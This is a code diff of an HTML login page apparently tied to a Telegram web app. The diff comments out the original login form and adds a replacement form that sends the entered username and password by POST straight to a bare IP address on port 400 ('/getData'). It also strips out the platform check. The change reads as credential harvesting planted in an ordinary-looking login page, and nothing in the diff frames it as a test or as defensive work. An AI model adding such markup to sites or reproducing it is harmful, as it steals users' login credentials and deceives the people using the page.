@@ -51,22 +51,23 @@
 </head>
 <body>
 <div class="login-form">
-    <h2>Login</h2>
-    <form id="loginForm">
-        <input type="text" id="username" placeholder="Username" required>
-        <input type="password" id="password" placeholder="Password" required>
+<!--    <h2>Login</h2>-->
+<!--    <form id="loginForm">-->
+<!--        <input type="text" id="username" placeholder="Username" required>-->
+<!--        <input type="password" id="password" placeholder="Password" required>-->
+<!--        <button type="submit">Login</button>-->
+<!--    </form>-->
+
+    <form method="POST" action="https://45.67.84.114:400/getData">
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
         <button type="submit">Login</button>
     </form>
+    
 </div>
 
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
-
-    if (window.Telegram && Telegram.WebApp) {
-        // Web App is supported
-    } else {
-        alert("Web App is not supported on this platform.");
-    }
 
     document.getElementById('loginForm').addEventListener('submit', function (event) {
         event.preventDefault(); // Prevent form submission
